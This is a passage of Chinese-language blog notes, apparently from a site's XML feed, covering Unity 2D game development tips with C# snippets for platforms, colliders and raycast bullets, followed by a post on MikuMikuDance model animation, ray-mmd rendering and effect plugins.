class="meta">Space</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="五、场景"><a href="#五、场景" class="headerlink" title="五、场景"></a>五、场景</h2><h3 id="1-Tile-Palette"><a href="#1-Tile-Palette" class="headerlink" title="1 Tile Palette"></a>1 Tile Palette</h3><blockquote><p>创建 Palette：</p><ol><li><p>Window——2D——Tile Palette——Create New Palette。</p></li><li><p>拖入图片，图片转换格式后存入一个新文件夹中。</p></li></ol><p>Edit Palette：</p><ul><li>S：选中物体</li><li>M：移动物体</li><li>B：选取后直接移动到场景中。</li><li>I：先选中，后按左键复制物体。</li><li>D：擦去场景中的错误。</li></ul><p>使用 Palette：</p><ol><li>Hierarchy右键——Create——2D Object——Tilemap</li><li>在Palette中选择Active Tilemap</li><li>在Palette中安B选择物体移动到场景中。</li></ol><p>碰撞器：</p><ol><li>添加Tilemap Collider 2D。（该项比较消耗资源，需要进行后续设置）</li><li>添加Composite Collider 2D，会自动添加Rigidbody 2D。</li><li>Rigidbody 2D——Body Type——Static。</li><li>Tilemap Collider 2D——Used By Composite。</li></ol></blockquote><h3 id="2-边界"><a href="#2-边界" class="headerlink" title="2 边界"></a>2 边界</h3><blockquote><p>限定边界用碰撞器。当玩家碰到底部物件（通过底部物件的名字判断）时直接杀死玩家。</p></blockquote><h3 id="3-平台"><a href="#3-平台" class="headerlink" title="3 平台"></a>3 平台</h3><blockquote><p>可穿越平台：</p><ol><li>设置一个父空物件，将地形作为该父物件的子物件。</li><li>给父物件添加Platform Effector 2D和Box Collider，Box Collider选择Used By Effector</li><li>设置Box Collider 2D的大小，使其大小仅仅为地面区域。</li></ol><p>Platform Effector 2D——Surface Arc：作用弧度。</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 可移动平台</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">PlatformMove</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> Vector3 originPosition, targetPosition, terminalPosition;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> moveSpeed;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        targetPosition = terminalPosition;</span><br><span class="line">        originPosition = transform.position;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update is called once per frame</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Update</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        Move();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Move</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (transform.position == targetPosition)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (targetPosition == originPosition)</span><br><span class="line">            &#123;</span><br><span class="line">                targetPosition = terminalPosition;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                targetPosition = originPosition;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        transform.position = Vector3.MoveTowards(transform.position, targetPosition, moveSpeed * Time.deltaTime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 站上平台后玩家跟随移动（此处为玩家脚本）</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnTriggerEnter2D</span>(<span class="params">Collider2D collision</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(collision.tag == <span class="string">&quot;AirPlatform&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*此处还需补充玩家的Jump相关方法*/</span></span><br><span class="line">        playerScript.transform.parent = collision.transform;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnTriggerExit2D</span>(<span class="params">Collider2D collision</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(collision.tag == <span class="string">&quot;AirPlatform&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">playerScript.transform.parent = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-UI"><a href="#4-UI" class="headerlink" title="4 UI"></a>4 UI</h3><blockquote><ol><li>Canvas——Render Mode——Screen Space-Camera</li><li>拖入主摄像机</li><li>Order in Layer设置大于场景Order in Layer</li></ol><p>Canvas Renderer 的 “Cull Transparent Mesh” 属性可以根据 UI 元素的透明度进行渲染剔除，以提高渲染性能。需要注意的是，这个属性只会影响透明的部分，对不透明的像素没有影响。</p></blockquote><hr><h2 id="六、设计"><a href="#六、设计" class="headerlink" title="六、设计"></a>六、设计</h2><h3 id="1-路线设计"><a href="#1-路线设计" class="headerlink" title="1 路线设计"></a>1 路线设计</h3><blockquote><p>根路线——多条子路线——多个路线点。</p><p>选择时，从跟路线出发，选择多条子路线中的一条以此保证随机性。</p><p>这些对象都是空物体。</p></blockquote><hr><h2 id="七、打包"><a href="#七、打包" class="headerlink" title="七、打包"></a>七、打包</h2><blockquote><p>手机型号查询：</p><ol><li><p>Package Manager——Device Simulator</p></li><li><p>Simulator——将game改成Simulator</p></li><li>查看手机的Safe Area</li></ol><p>背景有留白：</p><p>多创建两张背景，将背景进行拼接，从而解决留白。</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建一个SafePanel</span></span><br><span class="line"><span class="comment">// 拖入代码自动调节SafeArea区域大小</span></span><br><span class="line"><span class="comment">// 其他控件作为SafePanel的子物件</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">SafeAreaPanel</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> RectTransform panel;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        panel = GetComponent&lt;RectTransform&gt;();</span><br><span class="line"></span><br><span class="line">        Vector2 safeAreaMinPosition = Screen.safeArea.position;</span><br><span class="line">        Vector2 safeAreaMaxPosition = Screen.safeArea.position + Screen.safeArea.size;</span><br><span class="line"></span><br><span class="line">        safeAreaMinPosition.x = safeAreaMinPosition.x / Screen.width;</span><br><span class="line">        safeAreaMinPosition.y = safeAreaMinPosition.y / Screen.height;</span><br><span class="line"></span><br><span class="line">        safeAreaMaxPosition.x = safeAreaMaxPosition.x / Screen.width;</span><br><span class="line">        safeAreaMaxPosition.y = safeAreaMaxPosition.y / Screen.height;</span><br><span class="line"></span><br><span class="line">        panel.anchorMin = safeAreaMinPosition;</span><br><span class="line">        panel.anchorMax = safeAreaMaxPosition;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="八、问题"><a href="#八、问题" class="headerlink" title="八、问题"></a>八、问题</h2><h3 id="1-物件翻转"><a href="#1-物件翻转" class="headerlink" title="1 物件翻转"></a>1 物件翻转</h3><blockquote><p>刚体中设置固定Z轴。</p></blockquote><h3 id="2-墙壁"><a href="#2-墙壁" class="headerlink" title="2 墙壁"></a>2 墙壁</h3><blockquote><p>卡墙：给玩家的Rigidbody 2D加Material。Material的Friction设置为0。</p><p>靠墙跳无法触发跳跃动画：父物体下加一个空物体，空物体加上Box Collider 2D，选上Is Trigger，拉到人物底部，调整大小为宽度同人物宽，高度尽可能小。</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 靠墙跳无法触发跳跃动画，脚本挂在空物体上</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">PlayerTrigger</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> PlayerControl playerScript;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 获得父物体脚本，用于下面设置参数</span></span><br><span class="line">        playerScript = GetComponentInParent&lt;PlayerControl&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnTriggerEnter2D</span>(<span class="params">Collider2D collision</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (collision.tag == <span class="string">&quot;Ground&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            playerScript.canJump = <span class="literal">true</span>;</span><br><span class="line">            playerScript.animator.SetBool(<span class="string">&quot;Jump&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-碰撞器"><a href="#3-碰撞器" class="headerlink" title="3 碰撞器"></a>3 碰撞器</h3><ol><li><p>碰撞器位置</p><blockquote><p>调整好碰撞器后，当动画发生切换时，此时图片大小会发生变化，碰撞器位置也会发生变化。</p><p>解决方法：可以点击图片——Privot——Custom手动调整偏移。</p></blockquote></li><li><p>碰撞器休眠</p><blockquote><p>当玩家不移动时，碰撞器会休眠。此时再攻击会无法触发攻击效果。</p><p>解决方法1：Rigidbody 2D——Sleeping Mode——Never Sleep。</p><p>注：该设置十分消耗性能，一般只给玩家设置即可。</p><p>解决方法2：玩家的判断攻击的子物体中加上Rigidbody 2D——Body Type——Kinematic。此时玩家不需要再设置为Never Sleep了。因为Collider中的Info的判定信息变成了攻击的子物体而不是玩家。</p></blockquote></li><li><p>无法重复碰撞</p><blockquote><p>当玩家受伤后，敌人进入了玩家体内，此时当无敌结束后，玩家不会再收到伤害。原因是因为Trigger只有Enter没有Stay</p><p>解决方法：让玩家既有 OnTriggerEnter又有 OnTriggerStay。其内部代码是一样的。</p></blockquote></li><li><p>摄像头碰撞器</p><blockquote><p>当给摄像头添加了碰撞器后，人物在碰到摄像头后会出现在异常位置。</p><p>解决方法：新加一个Layer为BoundCamera。然后在Physics 2D中取消BoundCamera与别的层的碰撞，只保留和自己的。</p></blockquote></li><li><p>触发器重叠</p><blockquote><p>玩家下的子物体和玩家都有触发器时，玩家的子物体触发时会判定被触发对象为玩家。</p><p>解决方法：给子物体加一个Rigidbody 2D，设置Body Type为Kinematic。</p></blockquote></li></ol><h3 id="4-重复动画播放"><a href="#4-重复动画播放" class="headerlink" title="4 重复动画播放"></a>4 重复动画播放</h3><blockquote><p>设置了trigger的属性可能会重复播放动画。</p><p>解决方法：需要在动画的最后一帧加上事件，事件绑定函数重置触发器。</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动画</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Update</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">float</span> swordAttack = Input.GetAxisRaw(<span class="string">&quot;Sword&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (swordAttack &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        animator.SetTrigger(<span class="string">&quot;Attack&quot;</span>);</span><br><span class="line">        isAttack = <span class="literal">true</span>;</span><br><span class="line">        canJump = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 重置触发器</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SetIsAttackFalse</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    isAttack = <span class="literal">false</span>;</span><br><span class="line">    canJump = <span class="literal">true</span>;</span><br><span class="line">    animator.ResetTrigger(<span class="string">&quot;Attack&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-受伤"><a href="#5-受伤" class="headerlink" title="5 受伤"></a>5 受伤</h3><blockquote><p>在播放受伤动画时输入的值会被记录，导致动画结束后会立刻执行响应动作。（例如：被击飞时按了闪现，落地后会立刻闪现）</p><p>受伤后不会无敌，会重复受伤。</p><p>解决方法：在相应条件后面加上<code>&amp;&amp; isHurt == false</code>。例如：<code>if (jump &gt; 0 &amp;&amp; canJump == true &amp;&amp; isHurt == false)</code></p></blockquote><h3 id="6-远程武器被挡"><a href="#6-远程武器被挡" class="headerlink" title="6 远程武器被挡"></a>6 远程武器被挡</h3><blockquote><p>武器设定碰撞为<code>if (collision != null &amp;&amp; collision.tag != &quot;Player&quot;)</code>。当玩家使用远程武器时，武器会被敌人设定的AttackCollider空物体给摧毁。</p><p>解决方法：设定Layer，玩家攻击为PlayerAttack，敌人攻击为EnemyAttack。然后到Edit——Project Setting——Physics 2D，然后把两者的作用关系的勾取消掉即可。</p></blockquote><h3 id="7-背景"><a href="#7-背景" class="headerlink" title="7 背景"></a>7 背景</h3><blockquote><p>背景不随人物移动。</p><p>解决方法：拖动背景作为主摄像机的子物体。</p></blockquote><h3 id="8-寻路穿墙"><a href="#8-寻路穿墙" class="headerlink" title="8 寻路穿墙"></a>8 寻路穿墙</h3><blockquote><p>某些敌方单位会跟随玩家移动，此时会发生穿墙，浮空等BUG。</p><p>解决方法：</p><ol><li>在地方单位两侧设置停止点，停止点为空物体，加上触发器。</li><li>给地方单位加上刚体，设置为Body Type——Kinematic。</li></ol></blockquote><h3 id="9-寻找物件"><a href="#9-寻找物件" class="headerlink" title="9 寻找物件"></a>9 寻找物件</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 找到没有父物件的Canvas</span></span><br><span class="line">canvas = GameObject.Find(<span class="string">&quot;/Canvas&quot;</span>).GetComponent&lt;Canvas&gt;();</span><br></pre></td></tr></table></figure><h3 id="10-子弹判定"><a href="#10-子弹判定" class="headerlink" title="10 子弹判定"></a>10 子弹判定</h3><blockquote><p>因为速度太快，用碰撞和触发不一定会触发，所以要用射线判定。</p><p>图层：设置哪一层射线就检测哪一层。可以给敌人专门做一个层。</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Bullet</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> speed = <span class="number">50f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> maxDistance = <span class="number">300f</span>;</span><br><span class="line">    <span class="keyword">public</span> LayerMask hitLayers;  <span class="comment">// 可以被射线击中的层级</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Update</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 根据速度求得子弹的移动距离</span></span><br><span class="line">        <span class="built_in">float</span> distance = speed * Time.deltaTime;</span><br><span class="line"></span><br><span class="line">        RaycastHit hit;</span><br><span class="line">        <span class="comment">// 起点，终点，击中信息，最远距离，图层</span></span><br><span class="line">        <span class="keyword">if</span> (Physics.Raycast(transform.position, transform.forward, <span class="keyword">out</span> hit, distance, hitLayers))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 如果射线击中任何物体，通过碰撞信息做相应处理</span></span><br><span class="line">            Debug.Log(<span class="string">&quot;射中了：&quot;</span> + hit.collider.gameObject.name);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 在此处添加根据碰撞物体进行的操作，比如造成伤害、触发特效等</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 更新子弹位置</span></span><br><span class="line">        transform.Translate(Vector3.forward * distance);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断是否超出最大距离，如果超出则销毁子弹对象</span></span><br><span class="line">        <span class="keyword">if</span> (Vector3.Distance(transform.parent.position, transform.position) &gt;= maxDistance)</span><br><span class="line">        &#123;</span><br><span class="line">            Destroy(gameObject);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="九、优化"><a href="#九、优化" class="headerlink" title="九、优化"></a>九、优化</h2><h3 id="1-资源重复加载"><a href="#1-资源重复加载" class="headerlink" title="1 资源重复加载"></a>1 资源重复加载</h3><blockquote><p>为节约性能，把需要重复加载的内容放在ResourcesManager类中。然后在该类中写静态构造函数和静态方法。静态构造函数负责读取资源到类中。静态函数负责被其他类调用返回指定资源。</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 案例</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ResourcesManager</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Dictionary&lt;<span class="built_in">int</span>, Sprite&gt; spriteDict;</span><br><span class="line">    <span class="comment">// 构造函数，从文件中读取资源到内存</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="title">ResourcesManager</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        spriteDict = <span class="keyword">new</span> Dictionary&lt;<span class="built_in">int</span>, Sprite&gt;();</span><br><span class="line">        SpriteAtlas sprites = Resources.Load&lt;SpriteAtlas&gt;(<span class="string">&quot;People&quot;</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (Sprite sprite <span class="keyword">in</span> sprites.GetPackables())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">int</span> id = <span class="built_in">int</span>.Parse(sprite.name);</span><br><span class="line">            spriteDict.Add(id, sprite);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> 读取数字精灵</span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name=&quot;number&quot;&gt;</span>数字<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span>精灵<span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Sprite <span class="title">LoadSprite</span>(<span class="params"><span class="built_in">int</span> number</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> spriteDict[number];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 游戏程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 游戏引擎 </tag>
            
            <tag> Unity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MMD</title>
      <link href="/posts/b3657340.html"/>
      <url>/posts/b3657340.html</url>
      
        <content type="html"><![CDATA[<h1 id="MMD"><a href="#MMD" class="headerlink" title="MMD"></a>MMD</h1><blockquote><p><a href="https://www.aplaybox.com/">模之屋</a></p><p><a href="https://bowlroll.net/">BowlRoll</a></p></blockquote><hr><h2 id="一、基本使用"><a href="#一、基本使用" class="headerlink" title="一、基本使用"></a>一、基本使用</h2><h3 id="1-基本窗口"><a href="#1-基本窗口" class="headerlink" title="1 基本窗口"></a>1 基本窗口</h3><blockquote><p>顶端：顶端栏。</p><p>帧操作：音乐波形和动画帧。</p><p>动画曲线制作：平缓是匀速过度，向上弯减速，向下弯加速。</p><p>模型操作：导入模型进行后续操作，不同模型操作方式不同。</p><p>视点：三视图查看模型。</p><p>主窗口：右上坐标轴。</p></blockquote><h3 id="2-模型操作"><a href="#2-模型操作" class="headerlink" title="2 模型操作"></a>2 模型操作</h3><blockquote><p>照明：</p><ul><li>模型操作：做完相机操作后要点击注册进行保存。</li><li>照明操作：阴影颜色和阴影方向。</li><li>本影操作：未知。</li><li>附件操作：插件控制。</li></ul><p>人物模型：</p><ul><li><p>模型操作：做完人物操作后要点击注册进行保存。</p></li><li><p>骨骼操作：选择，选中后显示骨骼帧并且隐藏阴影，取消反之。</p></li><li><p>表情操作：面部表情调节。</p></li></ul></blockquote><h3 id="3-导入"><a href="#3-导入" class="headerlink" title="3 导入"></a>3 导入</h3><blockquote><p>模型：.pmx，.fx（小物件）。</p><p>动作：.vmd。</p><p>音乐：.wav。（仅wav）</p></blockquote><h3 id="4-导出"><a href="#4-导出" class="headerlink" title="4 导出"></a>4 导出</h3><blockquote><p>录制范围：0-fin（最后一帧）</p><p>视频压缩编码：MJPEG（视频大小较小）</p><p>然后等待渲染完所有帧后即导出成功。</p></blockquote><h3 id="5-摄像头移动"><a href="#5-摄像头移动" class="headerlink" title="5 摄像头移动"></a>5 摄像头移动</h3><blockquote><p>上下左右：shift + 鼠标右键 / 按住鼠标滚轮</p><p>前后：鼠标滚轮</p></blockquote><h3 id="6-快捷键"><a href="#6-快捷键" class="headerlink" title="6 快捷键"></a>6 快捷键</h3><blockquote><p>tab：切换模型</p><p>A：全选模型</p><p>X：旋转模型点</p><p>B：背景全黑</p><p>P：播放 / 停止播放</p><p>小键盘：</p><ul><li>2：正面</li><li>5：顶部</li><li>4：左边</li><li>6：右边</li><li>8：后面</li><li>0：底部</li></ul><p>alt + []：选中顶栏选项</p></blockquote><h3 id="7-其他调节"><a href="#7-其他调节" class="headerlink" title="7 其他调节"></a>7 其他调节</h3><blockquote><p>减少BUG和节省资源：在显示中打开【编辑模型时保持相机和光照】，关闭【抗锯齿】和【各项异性过滤】。</p><p>该分辨率：在显示中修改分辨率。</p></blockquote><hr><h2 id="二、动作"><a href="#二、动作" class="headerlink" title="二、动作"></a>二、动作</h2><h3 id="1-移动"><a href="#1-移动" class="headerlink" title="1 移动"></a>1 移动</h3><blockquote><p>【圆点：点击圆点变成黄圈红线，此时是进行微型调整。再次点击变成红点绿线，此时是进行整个骨骼移动。选中后通过移动屏幕右下角的方向进行调整。】</p><p>调整好后，在帧操作中选中帧，点击骨骼操作的注册完成帧载入。删除帧则是点击帧，然后再点击帧操作的删除。</p></blockquote><h3 id="2-帧操作"><a href="#2-帧操作" class="headerlink" title="2 帧操作"></a>2 帧操作</h3><blockquote><p>范围选择：可以选定帧范围进行删除。</p></blockquote><h3 id="3-骨骼"><a href="#3-骨骼" class="headerlink" title="3 骨骼"></a>3 骨骼</h3><blockquote><p>方形：点击后既可旋转也可移动。</p><p>圆形：点击后只可以旋转。</p><p>骨骼之间可以进行父子绑定，箭头指向的终点是子骨骼。</p><p>KF骨骼链：正向计算。圆接圆接圆。</p><p>IK骨骼链：反向计算。通过移动最后一个孩子反向计算所有骨骼的运动。圆接圆接圆，最后一个再加一个方，然后进行一系列绑定。</p></blockquote><h3 id="4-绑骨"><a href="#4-绑骨" class="headerlink" title="4 绑骨"></a>4 绑骨</h3><blockquote><p>小物件绑定：模型操作——外：</p><ol><li>对象骨骼【センター】</li><li>外部亲模型【主模型】</li><li>外部亲姿势【绑定的位置】</li></ol></blockquote><hr><h2 id="三、渲染"><a href="#三、渲染" class="headerlink" title="三、渲染"></a>三、渲染</h2><h3 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1 基础知识"></a>1 基础知识</h3><blockquote><p>背景——模型绘制顺序：一般是天空盒、场景、人物。</p><p>渲染时关闭抗锯齿，地面阴影显示，mapmaip</p></blockquote><h3 id="2-ray渲染"><a href="#2-ray渲染" class="headerlink" title="2 ray渲染"></a>2 ray渲染</h3><blockquote><p>组件为ray-mmd-1.5.1</p></blockquote><h4 id="2-1-使用"><a href="#2-1-使用" class="headerlink" title="2.1 使用"></a>2.1 使用</h4><blockquote><ol><li>拖入ray.x【在照明的附件中】和ray_controller.pmx【在模型操作中】</li><li>拖入天空盒：ray——Skybox【在模型操作中】</li><li>物件渲染：MMEffect——工フェクトファイル割り当て——EffecfFile【导入文件】（上面会有当前导入区域，如Main。名字对应ray中的文件夹，拖入的文件是.fx）</li></ol></blockquote><h4 id="2-2-普通使用"><a href="#2-2-普通使用" class="headerlink" title="2.2 普通使用"></a>2.2 普通使用</h4><blockquote><p>普通渲染：</p><ul><li>Main——人物——Main——Main.fx</li><li>EvLightMap——天空盒——对应天空盒路径——Sky with lighting.fx</li></ul><p>天空盒调节【在表情操作中】：</p><ul><li>Helipad GoldenHour【带环境】：调节光的颜色，漫反射和镜面反射强度。</li><li>Sky Hemisphere【纯白，用于实景合成】：调节光的颜色，不同选项作用的位置不同。</li><li>Sky Night【夜景，同上】</li><li>Time of day【白天海滩】：太阳光，环境光，雾气，云。</li><li>Time of night【夜景，同上】</li></ul></blockquote><h4 id="2-3-材质渲染"><a href="#2-3-材质渲染" class="headerlink" title="2.3 材质渲染"></a>2.3 材质渲染</h4><blockquote><p>材质渲染【MaterialMap】：选中物体——サブセット展開——对单个物体配置材质。</p><ul><li>光：Emissive</li></ul><p>AL_EmitterRT：点击解除后会直接变成亮光，再次点击会装载。</p></blockquote><h4 id="2-4-光"><a href="#2-4-光" class="headerlink" title="2.4 光"></a>2.4 光</h4><blockquote><p>光物件【Lighting】：导入光源——配置材质。</p><ul><li>SpotLight.pmx：聚光灯</li></ul></blockquote><h4 id="2-5-其他"><a href="#2-5-其他" class="headerlink" title="2.5 其他"></a>2.5 其他</h4><blockquote><p>SSAO</p><ul><li>屏幕空间环境光遮蔽（Screen Space Ambient Occlusion）。材质在Shadow文件夹中，作用于人物部位。</li><li>增加立体感。</li></ul></blockquote><h4 id="2-6-单独配置"><a href="#2-6-单独配置" class="headerlink" title="2.6 单独配置"></a>2.6 单独配置</h4><blockquote><p>素材文件配置：</p><ol><li>素材图片——PS打开——滤镜——3D——生成法线图——导出——English.png</li><li><p>ray——Materials——material_2.0.fx 和 material_common_2.0.fxsub 拖入到png路径下并改material_2.0.fx为同名.fx（为了区分）——打开 English.fx配置：</p><ul><li><code>#define NORMAL_MAP_FROM 1</code></li><li><code>#define NORMAL_MAP_FILE &quot;English.png&quot;</code></li></ul></li><li><p>MME——MaterialMap——配置对应对象的材质为English.fx</p></li></ol></blockquote><p>其他属性配置：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 平滑度</span></span><br><span class="line"><span class="type">const</span> <span class="type">float</span> normalMapScale;</span><br><span class="line"><span class="comment">// 平滑度</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMOOTHNESS_MAP_*;</span></span><br></pre></td></tr></table></figure><h4 id="2-7-视频背景"><a href="#2-7-视频背景" class="headerlink" title="2.7 视频背景"></a>2.7 视频背景</h4><blockquote><p>识别avs：<a href="https://avs-plus.net/">AviSynth+ (avs-plus.net)</a></p><p>avi变avs：MMBG.bat</p><ol><li>添加墙的pmx</li><li>背景——导入背景视频——导入avs（有的avi也行）</li><li>ray——Extension——DummyScreen——DummyScreen.x</li><li>ray——Materials——Video——material_screen_led.fx给墙</li></ol></blockquote><hr><h2 id="四、插件"><a href="#四、插件" class="headerlink" title="四、插件"></a>四、插件</h2><blockquote><p>插件是挂载在照明处，可以挂载多个，点击显示可以选择是否显示插件。</p><p>多个插件可能会导致黑屏：在背景——编辑附件中改变附件顺序即可。</p></blockquote><h3 id="1-AutoLuminous4"><a href="#1-AutoLuminous4" class="headerlink" title="1 AutoLuminous4"></a>1 AutoLuminous4</h3><blockquote><p>自动光源</p><p>拖入AutoLuminous.x给照明，调节Si即可调节亮度。</p></blockquote><h3 id="2-CheapLens"><a href="#2-CheapLens" class="headerlink" title="2 CheapLens"></a>2 CheapLens</h3><blockquote><p>模糊处理</p><p>拖入CheapLens.x给照明，调节Si即可调节模糊度。</p></blockquote><h3 id="3-Diffusion"><a href="#3-Diffusion" class="headerlink" title="3 Diffusion"></a>3 Diffusion</h3><blockquote><p>柔和处理</p></blockquote><h3 id="4-OpticalFlares"><a href="#4-OpticalFlares" class="headerlink" title="4 OpticalFlares"></a>4 OpticalFlares</h3><blockquote><p>自动光晕</p></blockquote><h3 id="5-tk-grid-floor"><a href="#5-tk-grid-floor" class="headerlink" title="5 tk_grid_floor"></a>5 tk_grid_floor</h3><blockquote><p>地板镜面反射</p></blockquote><h2 id="五、问题"><a href="#五、问题" class="headerlink" title="五、问题"></a>五、问题</h2><h3 id="1-衣服卡住"><a href="#1-衣服卡住" class="headerlink" title="1 衣服卡住"></a>1 衣服卡住</h3><blockquote><p>人物全选，然后上下左右移动移动。</p></blockquote><h3 id="2-穿模"><a href="#2-穿模" class="headerlink" title="2 穿模"></a>2 穿模</h3><blockquote><p>逐帧查看，发现穿模位置后简单调整后点击骨骼注册，然后再次查看是否穿模。</p><p>或者调整不了可以找到不穿模的那一帧，然后把后续的穿模的几帧删除。</p></blockquote><h3 id="3-pmx制作"><a href="#3-pmx制作" class="headerlink" title="3 pmx制作"></a>3 pmx制作</h3><blockquote><ol><li>安装PmxEditor</li></ol></blockquote><h3 id="4-MMEffect只有Main"><a href="#4-MMEffect只有Main" class="headerlink" title="4 MMEffect只有Main"></a>4 MMEffect只有Main</h3><blockquote><p>fx的路径问题。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 游戏美术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 动画 </tag>
            
